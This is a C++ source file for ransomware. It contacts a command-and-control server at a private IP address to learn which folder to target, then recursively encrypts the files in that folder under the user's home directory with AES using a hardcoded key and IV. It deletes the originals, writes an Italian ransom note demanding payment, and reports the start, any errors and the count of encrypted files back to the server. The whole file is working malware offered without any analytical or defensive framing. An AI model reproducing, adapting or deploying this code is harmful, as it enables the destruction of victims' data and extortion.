#include <iostream>
#include <fstream>
#include <filesystem>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/err.h>
#include "C2CCommunication.h"

namespace fs = std::filesystem;

// KEY = IV = 12345678123456781234567812345678
static const uint8_t KEY[] = { 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78 };
static const uint8_t IV[] = { 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78 };

static const std::string C2APIURL = "http://10.211.55.2:8080/api/track"; // "http://10.211.55.2:8080/api/track"

int totalFiles = 0;

void handleErrors() {
    ERR_print_errors_fp(stderr);
    abort();
}

void encryptFile(const fs::path& inputFilePath, const fs::path& outputFilePath) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) handleErrors();

    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, KEY, IV)) {
        handleErrors();
    }

    std::ifstream inFile(inputFilePath, std::ios::binary);
    std::ofstream outFile(outputFilePath, std::ios::binary);

    if (!inFile.is_open() || !outFile.is_open()) {
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    unsigned char buffer[1024];
    unsigned char* ciphertext = new unsigned char[1024 + EVP_CIPHER_block_size(EVP_aes_128_cbc())];

    int len;
    int ciphertext_len;
    while (inFile.read(reinterpret_cast<char*>(buffer), sizeof(buffer)) || inFile.gcount() > 0) {
        if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, buffer, inFile.gcount())) {
            handleErrors();
        }
        outFile.write(reinterpret_cast<char*>(ciphertext), len);
    }

    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext, &ciphertext_len)) {
        handleErrors();
    }
    outFile.write(reinterpret_cast<char*>(ciphertext), ciphertext_len);

    inFile.close();
    outFile.close();
    EVP_CIPHER_CTX_free(ctx);
}

void processFilesInDirectory(const fs::path& directoryPath) {
    for (const auto& entry : fs::directory_iterator(directoryPath)) {
        if(entry.is_directory()) {
            processFilesInDirectory(entry.path());
        } else if (entry.is_regular_file() && entry.path().filename().string().find(".") != 0) {
            fs::path inputFilePath = entry.path();
            fs::path encryptedFilePath = inputFilePath;
            encryptedFilePath += ".enc";

            encryptFile(inputFilePath, encryptedFilePath);
            fs::remove(inputFilePath);
            totalFiles++;
        }
    }
}

void writeReadme(const fs::path& directoryPath) {
    fs::path outputFilePath = fs::path(directoryPath) / "__README.txt";

    std::ofstream outFile(outputFilePath);
    if (outFile.is_open()) {
        outFile << "Il contenuto di questa cartella è stato cifrato.\n";
        outFile << "Per riavere i tuoi file indietro devi pagare un riscatto.\n";
        outFile.close();
    }
}

int main() {
    std::string directoryPath;
    std::string folderEncrypted;

    // Check Win
    const char* userProfileWin = std::getenv("USERPROFILE");
    if (userProfileWin != nullptr) {
        directoryPath = std::string(userProfileWin);
    }

    // No Win, check Linux / MacOS
    if (directoryPath.empty()) {
        const char* userProfileLinux = std::getenv("HOME");
        if (userProfileLinux != nullptr) {
            directoryPath = std::string(userProfileLinux);
        }
    }

    if(directoryPath.empty()) {
        return 1;
    }

    C2CCommunication c2(C2APIURL);
    std::map<std::string, std::string> result = c2.sendStart();

    std::string uuid = result["uuid"];
    std::string directory = result["directory"];

	if (uuid == "" || directory == "") {
		return 1;
	}

    try {
        processFilesInDirectory(directoryPath + "/" + directory);
        writeReadme(directoryPath + "/" + directory);
    }
    catch (const std::exception& e) {
		c2.sendError(uuid, e.what());
        return 1;        
    }

    c2.sendEnd(uuid, totalFiles);

    return 0;
}